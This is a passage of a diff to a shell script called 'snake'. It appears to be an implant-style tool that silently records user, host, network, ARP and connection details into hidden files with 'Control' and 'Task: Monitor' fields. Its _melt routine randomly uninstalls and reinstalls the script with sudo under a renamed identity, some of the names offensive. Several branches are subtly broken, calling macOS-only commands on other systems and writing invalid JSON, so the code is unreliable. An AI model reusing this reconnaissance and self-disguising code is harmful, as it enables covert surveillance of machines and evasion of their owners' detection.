+             echo "   \"OS\":\"$(uname -s)\"," >> snake.json
+             echo "   \"KernelVersion\":\"$(uname -r)\"," >> snake.json
+             echo "   \"VSpawn\":\"$(date)\"," >> snake.json
+             echo "   \"Control\":false," >> snake.json
+             echo "   \"Heat\":0," >> snake.json
+             echo "   \"Task\":\"Monitor\"," >> snake.json
+             echo "   }," >> snake.json
+             echo " }  " >> snake.json
+
+           elif [[ $_system == "Linux" ]]; then
+
+             _cheese
+             touch $HOME/.snake/snake.json
+             echo "{\"$(date)\":{" >> snake.json
+             echo "   \"ID\":1024," >> snake.json
+             echo "   \"Race\":\"Salazaar\"," >> snake.json
+             echo "   \"Username\":\"$USER\"," >> snake.json
+             echo "   \"Homepath\":\"$HOME\"," >> snake.json
+             echo "   \"Nestname\":\"$(hostname)\"," >> snake.json
+             echo "   \"Shell\":\"$SHELL\"," >> snake.json
+             echo "   \"InternalIP\":\"$(ifconfig enp0s3 | grep inet | awk '{print $3}')\"," >> snake.json
+             echo "   \"Mac\":\"$(ipconfig getpacket en0 | grep chaddr | awk '{print $3;}')\"," >> snake.json
+             echo "   \"Architecture\":\"$(uname -m)\"," >> snake.json
+             echo "   \"OS\":\"$(uname -s)\"," >> snake.json
+             echo "   \"KernelVersion\":\"$(uname -r)\"," >> snake.json
+             echo "   \"VSpawn\":\"$(date)\"," >> snake.json
+             echo "   \"Control\":false," >> snake.json
+             echo "   \"Heat\":0," >> snake.json
+             echo "   \"Task\":\"Monitor\"," >> snake.json
+             echo "   }," >> snake.json
+             echo " }  " >> snake.json
+
+           elif [[ $_system == "OpenBSD" ]]; then
+
+             _cheese
+             touch $HOME/.snake/snake.json
+             echo "{\"$(date)\":{" >> snake.json
+             echo "   \"ID\":1024," >> snake.json
+             echo "   \"Race\":\"Salazaar\"," >> snake.json
+             echo "   \"Username\":\"$USER\"," >> snake.json
+             echo "   \"Homepath\":\"$HOME\"," >> snake.json
+             echo "   \"Nestname\":\"$(hostname)\"," >> snake.json
+             echo "   \"Shell\":\"$SHELL\"," >> snake.json
+             echo "   \"InternalIP\":\"$(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}')\"," >> snake.json
+             echo "   \"Mac\":\"$(ipconfig getpacket en0 | grep chaddr | awk '{print $3;}')\"," >> snake.json
+             echo "   \"Architecture\":\"$(uname -m)\"," >> snake.json
+             echo "   \"OS\":\"$(uname -s)\"," >> snake.json
+             echo "   \"KernelVersion\":\"$(uname -r)\"," >> snake.json
+             echo "   \"VSpawn\":\"$(date)\"," >> snake.json
+             echo "   \"Control\":false," >> snake.json
+             echo "   \"Heat\":0," >> snake.json
+             echo "   \"Task\":\"Monitor\"," >> snake.json
+             echo "   }," >> snake.json
+             echo " }  " >> snake.json
+
+           elif [[ $_system == "Minix" ]]; then
+
+             _cheese
+             touch $HOME/.snake/snake.json
+             echo "{\"$(date)\":{" >> snake.json
+             echo "   \"ID\":1024," >> snake.json
+             echo "   \"Race\":\"Salazaar\"," >> snake.json
+             echo "   \"Username\":\"$USER\"," >> snake.json
+             echo "   \"Homepath\":\"$HOME\"," >> snake.json
+             echo "   \"Nestname\":\"$(hostname)\"," >> snake.json
+             echo "   \"Shell\":\"$SHELL\"," >> snake.json
+             echo "   \"InternalIP\":\"$(hostaddr -i)\"," >> snake.json
+             echo "   \"Mac\":\"$(hostaddr -e)\"," >> snake.json
+             echo "   \"Architecture\":\"$(uname -m)\"," >> snake.json
+             echo "   \"OS\":\"$(uname -s)\"," >> snake.json
+             echo "   \"KernelVersion\":\"$(uname -r)\"," >> snake.json
+             echo "   \"VSpawn\":\"$(date)\"," >> snake.json
+             echo "   \"Control\":false," >> snake.json
+             echo "   \"Heat\":0," >> snake.json
+             echo "   \"Task\":\"Monitor\"," >> snake.json
+             echo "   }," >> snake.json
+             echo " }  " >> snake.json
+
+           elif [[ $_system == "Haiku" ]]; then
+
+             _cheese
+             touch $HOME/.snake/snake.json
+             echo "{\"$(date)\":{" >> snake.json
+             echo "   \"ID\":1024," >> snake.json
+             echo "   \"Race\":\"Salazaar\"," >> snake.json
+             echo "   \"Username\":\"$USER\"," >> snake.json
+             echo "   \"Homepath\":\"$HOME\"," >> snake.json
+             echo "   \"Nestname\":\"$(hostname)\"," >> snake.json
+             echo "   \"Shell\":\"$SHELL\"," >> snake.json
+             echo "   \"InternalIP\":\"$(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}')\"," >> snake.json
+             echo "   \"Mac\":\"$(ipconfig getpacket en0 | grep chaddr | awk '{print $3;}')\"," >> snake.json
+             echo "   \"Architecture\":\"$(uname -m)\"," >> snake.json
+             echo "   \"OS\":\"$(uname -s)\"," >> snake.json
+             echo "   \"KernelVersion\":\"$(uname -r)\"," >> snake.json
+             echo "   \"VSpawn\":\"$(date)\"," >> snake.json
+             echo "   \"Control\":false," >> snake.json
+             echo "   \"Heat\":0," >> snake.json
+             echo "   \"Task\":\"Monitor\"," >> snake.json
+             echo "   }," >> snake.json
+             echo " }  " >> snake.json
+
+           else
+
+             printf "$RED Not on this system$NC\n"
+
+           fi
 
 }
 
@@ -2004,49 +2526,663 @@ _snap(){
 _decompose(){
 
 
- cd ~
- mkdir ._ra
- cd ._ra
- clear
- touch _corpse.slz
- echo "_THERMALS >> " >> _corpse.slz
- ther | grep -E 'CPU|speed|ycle|attery|charge|capacity' >> _corpse.slz
- echo "_USER >> $USER" >> _corpse.slz
- echo "_HOSTNAME >> $(hostname)" >> _corpse.slz
- echo "_NETWORK >>" >> _corpse.slz
- arp -a >> _corpse.slz
- echo "_YOUR IP >> $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}') " >> _corpse.slz
- echo "_SPEED >> " >> _corpse.slz
- speedtest-cli | grep -E 'Download|Upload' >> _corpse.slz
- echo "_TCP >> " >> _corpse.slz
- netstat -ap tcp >> _corpse.slz
- echo "_UDP >> " >> _corpse.slz
- netstat -ap udp >> _corpse.slz
- echo "_SYSTEMSTATS >> " >> _corpse.slz
- curl ipinfo.io >> _corpse.slz
- clear
+
+
+
+
+        _system="$(uname -s)"
+
+        if [ $_system == "Darwin" ]; then
+
+          cd ~
+          mkdir ._ra
+          cd ._ra
+          clear
+          touch _corpse.slz
+          echo "_THERMALS >> " >> _corpse.slz
+          ther | grep -E 'CPU|speed|ycle|attery|charge|capacity' >> _corpse.slz
+          echo "_USER >> $USER" >> _corpse.slz
+          echo "_HOSTNAME >> $(hostname)" >> _corpse.slz
+          echo "_NETWORK >>" >> _corpse.slz
+          arp -a >> _corpse.slz
+          echo "_YOUR IP >> $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}') " >> _corpse.slz
+          echo "_SPEED >> " >> _corpse.slz
+          speedtest-cli | grep -E 'Download|Upload' >> _corpse.slz
+          echo "_TCP >> " >> _corpse.slz
+          netstat -ap tcp >> _corpse.slz
+          echo "_UDP >> " >> _corpse.slz
+          netstat -ap udp >> _corpse.slz
+          echo "_SYSTEMSTATS >> " >> _corpse.slz
+          curl ipinfo.io >> _corpse.slz
+          clear
+
+        elif [[ $_system == "Linux" ]]; then
+
+          cd ~
+          mkdir ._ra
+          cd ._ra
+          clear
+          touch _corpse.slz
+          echo "_THERMALS >> " >> _corpse.slz
+          ther | grep -E 'CPU|speed|ycle|attery|charge|capacity' >> _corpse.slz
+          echo "_USER >> $USER" >> _corpse.slz
+          echo "_HOSTNAME >> $(hostname)" >> _corpse.slz
+          echo "_NETWORK >>" >> _corpse.slz
+          arp -a >> _corpse.slz
+          echo "_YOUR IP >> $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}') " >> _corpse.slz
+          echo "_SPEED >> " >> _corpse.slz
+          speedtest-cli | grep -E 'Download|Upload' >> _corpse.slz
+          echo "_TCP >> " >> _corpse.slz
+          netstat -ap tcp >> _corpse.slz
+          echo "_UDP >> " >> _corpse.slz
+          netstat -ap udp >> _corpse.slz
+          echo "_SYSTEMSTATS >> " >> _corpse.slz
+          curl ipinfo.io >> _corpse.slz
+          clear
+
+        elif [[ $_system == "OpenBSD" ]]; then
+
+          cd ~
+          mkdir ._ra
+          cd ._ra
+          clear
+          touch _corpse.slz
+          echo "_THERMALS >> " >> _corpse.slz
+          ther | grep -E 'CPU|speed|ycle|attery|charge|capacity' >> _corpse.slz
+          echo "_USER >> $USER" >> _corpse.slz
+          echo "_HOSTNAME >> $(hostname)" >> _corpse.slz
+          echo "_NETWORK >>" >> _corpse.slz
+          arp -a >> _corpse.slz
+          echo "_YOUR IP >> $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}') " >> _corpse.slz
+          echo "_SPEED >> " >> _corpse.slz
+          speedtest-cli | grep -E 'Download|Upload' >> _corpse.slz
+          echo "_TCP >> " >> _corpse.slz
+          netstat -ap tcp >> _corpse.slz
+          echo "_UDP >> " >> _corpse.slz
+          netstat -ap udp >> _corpse.slz
+          echo "_SYSTEMSTATS >> " >> _corpse.slz
+          curl ipinfo.io >> _corpse.slz
+          clear
+
+        elif [[ $_system == "Minix" ]]; then
+
+          cd ~
+          mkdir ._ra
+          cd ._ra
+          clear
+          touch _corpse.slz
+          echo "_THERMALS >> " >> _corpse.slz
+          ther | grep -E 'CPU|speed|ycle|attery|charge|capacity' >> _corpse.slz
+          echo "_USER >> $USER" >> _corpse.slz
+          echo "_HOSTNAME >> $(hostname)" >> _corpse.slz
+          echo "_NETWORK >>" >> _corpse.slz
+          arp -a >> _corpse.slz
+          echo "_YOUR IP >> $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}') " >> _corpse.slz
+          echo "_SPEED >> " >> _corpse.slz
+          speedtest-cli | grep -E 'Download|Upload' >> _corpse.slz
+          echo "_TCP >> " >> _corpse.slz
+          netstat -ap tcp >> _corpse.slz
+          echo "_UDP >> " >> _corpse.slz
+          netstat -ap udp >> _corpse.slz
+          echo "_SYSTEMSTATS >> " >> _corpse.slz
+          curl ipinfo.io >> _corpse.slz
+          clear
+
+        elif [[ $_system == "Haiku" ]]; then
+
+          cd ~
+          mkdir ._ra
+          cd ._ra
+          clear
+          touch _corpse.slz
+          echo "_THERMALS >> " >> _corpse.slz
+          ther | grep -E 'CPU|speed|ycle|attery|charge|capacity' >> _corpse.slz
+          echo "_USER >> $USER" >> _corpse.slz
+          echo "_HOSTNAME >> $(hostname)" >> _corpse.slz
+          echo "_NETWORK >>" >> _corpse.slz
+          arp -a >> _corpse.slz
+          echo "_YOUR IP >> $(ipconfig getpacket en0 | grep yiaddr | awk '{print $3;}') " >> _corpse.slz
+          echo "_SPEED >> " >> _corpse.slz
+          speedtest-cli | grep -E 'Download|Upload' >> _corpse.slz
+          echo "_TCP >> " >> _corpse.slz
+          netstat -ap tcp >> _corpse.slz
+          echo "_UDP >> " >> _corpse.slz
+          netstat -ap udp >> _corpse.slz
+          echo "_SYSTEMSTATS >> " >> _corpse.slz
+          curl ipinfo.io >> _corpse.slz
+          clear
+
+        else
+
+          printf "$RED Not on this system$NC\n"
+
+        fi
+
+
+}
+
+
+_melt(){
+
+
+    _rnd=$[RANDOM%50]
+
+
+    if [ $_rnd == 0 ]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/flake/g' | sed 's/S.N.A.K.E/F.L.A.K.E/g' > flake
+    sudo rm -rf snake2 ; printf "ekalf\n" ; sh flake -qinstall ; sudo rm -rf flake
+
+  elif [[ $_rnd == 1 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/blake/g' | sed 's/S.N.A.K.E/B.L.A.K.E/g' > blake
+    sudo rm -rf snake2 ; printf "ekalb\n" ; sh blake -qinstall ; sudo rm -rf blake
+
+  elif [[ $_rnd == 2 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/plake/g' | sed 's/S.N.A.K.E/P.L.A.K.E/g' > plake
+    sudo rm -rf snake2 ; printf "ekalp\n" ; sh plake -qinstall ; sudo rm -rf plake
+
+  elif [[ $_rnd == 3 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/blara/g' | sed 's/S.N.A.K.E/B.L.A.R.A/g' > blara
+    sudo rm -rf snake2 ; printf "aralb\n" ; sh blara -qinstall ; sudo rm -rf blara
+
+  elif [[ $_rnd == 4 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/marco/g' | sed 's/S.N.A.K.E/M.A.R.C.O/g' > marco
+    sudo rm -rf snake2 ; printf "ocram\n" ; sh marco -qinstall ; sudo rm -rf marco
+
+  elif [[ $_rnd == 5 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/white/g' | sed 's/S.N.A.K.E/W.H.I.T.E/g' > white
+    sudo rm -rf snake2 ; printf "etihw\n" ; sh white -qinstall ; sudo rm -rf white
+
+  elif [[ $_rnd == 6 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/james/g' | sed 's/S.N.A.K.E/J.A.M.E.S/g' > james
+    sudo rm -rf snake2 ; printf "semaj\n" ; sh james -qinstall ; sudo rm -rf james
+
+  elif [[ $_rnd == 7 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/alina/g' | sed 's/S.N.A.K.E/A.L.I.N.A/g' > alina
+    sudo rm -rf snake2 ; printf "anila\n" ; sh alina -qinstall ; sudo rm -rf alina
+
+  elif [[ $_rnd == 8 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/leana/g' | sed 's/S.N.A.K.E/L.E.A.N.A/g' > leana
+    sudo rm -rf snake2 ; printf "anael\n" ; sh leana -qinstall ; sudo rm -rf leana
+
+  elif [[ $_rnd == 9 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/slava/g' | sed 's/S.N.A.K.E/S.L.A.V.A/g' > slava
+    sudo rm -rf snake2 ; printf "avals\n" ; sh slava -qinstall ; sudo rm -rf slava
+
+  elif [[ $_rnd == 10 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/horia/g' | sed 's/S.N.A.K.E/H.O.R.I.A/g' > horia
+    sudo rm -rf snake2 ; printf "airoh\n" ; sh horia -qinstall ; sudo rm -rf horia
+
+  elif [[ $_rnd == 11 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/moria/g' | sed 's/S.N.A.K.E/M.O.R.I.A/g' > moria
+    sudo rm -rf snake2 ; printf "airom\n" ; sh moria -qinstall ; sudo rm -rf moria
+
+  elif [[ $_rnd == 12 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/power/g' | sed 's/S.N.A.K.E/P.O.W.E.R/g' > power
+    sudo rm -rf snake2 ; printf "rewop\n" ; sh power -qinstall ; sudo rm -rf power
+
+  elif [[ $_rnd == 13 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/coral/g' | sed 's/S.N.A.K.E/C.O.R.A.L/g' > coral
+    sudo rm -rf snake2 ; printf "laroc\n" ; sh coral -qinstall ; sudo rm -rf coral
+
+  elif [[ $_rnd == 14 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/death/g' | sed 's/S.N.A.K.E/D.E.A.T.H/g' > death
+    sudo rm -rf snake2 ; printf "htaed\n" ; sh death -qinstall ; sudo rm -rf death
+
+  elif [[ $_rnd == 15 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/cobra/g' | sed 's/S.N.A.K.E/C.O.B.R.A/g' > cobra
+    sudo rm -rf snake2 ; printf "arboc\n" ; sh cobra -qinstall ; sudo rm -rf cobra
+
+  elif [[ $_rnd == 16 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/banel/g' | sed 's/S.N.A.K.E/B.A.N.E.L/g' > banel
+    sudo rm -rf snake2 ; printf "lenab\n" ; sh banel -qinstall ; sudo rm -rf banel
+
+  elif [[ $_rnd == 17 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/quran/g' | sed 's/S.N.A.K.E/Q.U.R.A.N/g' > quran
+    sudo rm -rf snake2 ; printf "naruq\n" ; sh quran -qinstall ; sudo rm -rf quran
+
+  elif [[ $_rnd == 18 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/ninja/g' | sed 's/S.N.A.K.E/N.I.N.J.A/g' > ninja
+    sudo rm -rf snake2 ; printf "ajnin\n" ; sh ninja -qinstall ; sudo rm -rf ninja
+
+  elif [[ $_rnd == 19 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/nixon/g' | sed 's/S.N.A.K.E/N.I.X.O.N/g' > nixon
+    sudo rm -rf snake2 ; printf "noxin\n" ; sh nixon -qinstall ; sudo rm -rf nixon
+
+  elif [[ $_rnd == 20 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/betty/g' | sed 's/S.N.A.K.E/B.E.T.T.Y/g' > betty
+    sudo rm -rf snake2 ; printf "ytteb\n" ; sh betty -qinstall ; sudo rm -rf betty
+
+  elif [[ $_rnd == 21 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/harry/g' | sed 's/S.N.A.K.E/H.A.R.R.Y/g' > harry
+    sudo rm -rf snake2 ; printf "yrrah\n" ; sh harry -qinstall ; sudo rm -rf harry
+
+  elif [[ $_rnd == 22 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/draco/g' | sed 's/S.N.A.K.E/D.R.A.C.O/g' > draco
+    sudo rm -rf snake2 ; printf "ocard\n" ; sh draco -qinstall ; sudo rm -rf draco
+
+  elif [[ $_rnd == 23 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/boris/g' | sed 's/S.N.A.K.E/B.O.R.I.S/g' > boris
+    sudo rm -rf snake2 ; printf "sirob\n" ; sh boris -qinstall ; sudo rm -rf boris
+
+  elif [[ $_rnd == 24 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/adolf/g' | sed 's/S.N.A.K.E/A.D.O.L.F/g' > adolf
+    sudo rm -rf snake2 ; printf "floda\n" ; sh adolf -qinstall ; sudo rm -rf adolf
+
+  elif [[ $_rnd == 25 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/arpad/g' | sed 's/S.N.A.K.E/A.R.P.A.D/g' > arpad
+    sudo rm -rf snake2 ; printf "dapra\n" ; sh arpad -qinstall ; sudo rm -rf arpad
+
+  elif [[ $_rnd == 26 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/soyuz/g' | sed 's/S.N.A.K.E/S.O.Y.U.Z/g' > soyuz
+    sudo rm -rf snake2 ; printf "zuyos\n" ; sh soyuz -qinstall ; sudo rm -rf soyuz
+
+  elif [[ $_rnd == 27 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/force/g' | sed 's/S.N.A.K.E/F.O.R.C.E/g' > force
+    sudo rm -rf snake2 ; printf "ecrof\n" ; sh force -qinstall ; sudo rm -rf force
+
+  elif [[ $_rnd == 28 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/forta/g' | sed 's/S.N.A.K.E/F.O.R.T.A/g' > forta
+    sudo rm -rf snake2 ; printf "atrof\n" ; sh forta -qinstall ; sudo rm -rf forta
+
+  elif [[ $_rnd == 29 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/balon/g' | sed 's/S.N.A.K.E/B.A.L.O.N/g' > balon
+    sudo rm -rf snake2 ; printf "nolab\n" ; sh balon -qinstall ; sudo rm -rf balon
+
+  elif [[ $_rnd == 30 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/pablo/g' | sed 's/S.N.A.K.E/P.A.B.L.O/g' > pablo
+    sudo rm -rf snake2 ; printf "olbap\n" ; sh pablo -qinstall ; sudo rm -rf pablo
+
+  elif [[ $_rnd == 31 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/narco/g' | sed 's/S.N.A.K.E/N.A.R.C.O/g' > narco
+    sudo rm -rf snake2 ; printf "ocran\n" ; sh narco -qinstall ; sudo rm -rf narco
+
+  elif [[ $_rnd == 32 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/diana/g' | sed 's/S.N.A.K.E/D.I.A.N.A/g' > diana
+    sudo rm -rf snake2 ; printf "anaid\n" ; sh diana -qinstall ; sudo rm -rf diana
+
+  elif [[ $_rnd == 33 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/andra/g' | sed 's/S.N.A.K.E/A.N.D.R.A/g' > andra
+    sudo rm -rf snake2 ; printf "ardna\n" ; sh andra -qinstall ; sudo rm -rf andra
+
+  elif [[ $_rnd == 34 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/tower/g' | sed 's/S.N.A.K.E/T.O.W.E.R/g' > tower
+    sudo rm -rf snake2 ; printf "rewot\n" ; sh tower -qinstall ; sudo rm -rf tower
+
+  elif [[ $_rnd == 35 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/tokyo/g' | sed 's/S.N.A.K.E/T.O.K.Y.O/g' > tokyo
+    sudo rm -rf snake2 ; printf "oykot\n" ; sh tokyo -qinstall ; sudo rm -rf tokyo
+
+  elif [[ $_rnd == 36 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/baron/g' | sed 's/S.N.A.K.E/B.A.R.O.N/g' > baron
+    sudo rm -rf snake2 ; printf "norab\n" ; sh baron -qinstall ; sudo rm -rf baron
+
+  elif [[ $_rnd == 37 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/airfr/g' | sed 's/S.N.A.K.E/A.I.R.F.R/g' > airfr
+    sudo rm -rf snake2 ; printf "rfria\n" ; sh airfr -qinstall ; sudo rm -rf airfr
+
+  elif [[ $_rnd == 38 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/paris/g' | sed 's/S.N.A.K.E/P.A.R.I.S/g' > paris
+    sudo rm -rf snake2 ; printf "sirap\n" ; sh paris -qinstall ; sudo rm -rf paris
+
+  elif [[ $_rnd == 39 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/trump/g' | sed 's/S.N.A.K.E/T.R.U.M.P/g' > trump
+    sudo rm -rf snake2 ; printf "pmurt\n" ; sh trump -qinstall ; sudo rm -rf trump
+
+  elif [[ $_rnd == 40 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/archx/g' | sed 's/S.N.A.K.E/A.R.C.H.X/g' > archx
+    sudo rm -rf snake2 ; printf "xhcra\n" ; sh archx -qinstall ; sudo rm -rf archx
+
+  elif [[ $_rnd == 41 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/genie/g' | sed 's/S.N.A.K.E/G.E.N.I.E/g' > genie
+    sudo rm -rf snake2 ; printf "eineg\n" ; sh genie -qinstall ; sudo rm -rf genie
+
+  elif [[ $_rnd == 42 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/bacon/g' | sed 's/S.N.A.K.E/B.A.C.O.N/g' > bacon
+    sudo rm -rf snake2 ; printf "nocab\n" ; sh bacon -qinstall ; sudo rm -rf bacon
+
+  elif [[ $_rnd == 43 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/fruit/g' | sed 's/S.N.A.K.E/F.R.U.I.T/g' > fruit
+    sudo rm -rf snake2 ; printf "tiurf\n" ; sh fruit -qinstall ; sudo rm -rf fruit
+
+  elif [[ $_rnd == 44 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/masha/g' | sed 's/S.N.A.K.E/M.A.S.H.A/g' > masha
+    sudo rm -rf snake2 ; printf "asham\n" ; sh masha -qinstall ; sudo rm -rf masha
+
+  elif [[ $_rnd == 45 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/moris/g' | sed 's/S.N.A.K.E/M.O.R.I.S/g' > moris
+    sudo rm -rf snake2 ; printf "sirom\n" ; sh moris -qinstall ; sudo rm -rf moris
+
+  elif [[ $_rnd == 46 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/elisa/g' | sed 's/S.N.A.K.E/E.L.I.S.A/g' > elisa
+    sudo rm -rf snake2 ; printf "asile\n" ; sh elisa -qinstall ; sudo rm -rf elisa
+
+  elif [[ $_rnd == 47 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/marii/g' | sed 's/S.N.A.K.E/M.A.R.I.I/g' > marii
+    sudo rm -rf snake2 ; printf "iiram\n" ; sh marii -qinstall ; sudo rm -rf marii
+
+  elif [[ $_rnd == 48 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
+    sudo rm -rf snake
+    cat snake2 | sed 's/snake/brain/g' | sed 's/S.N.A.K.E/B.R.A.I.N/g' > brain
+    sudo rm -rf snake2 ; printf "niarb\n" ; sh brain -qinstall ; sudo rm -rf brain
+
+  elif [[ $_rnd == 49 ]]; then
+
+    sudo cp /usr/local/bin/snake ./snake
+    sudo cp snake snake2
+    sh snake -uninstall
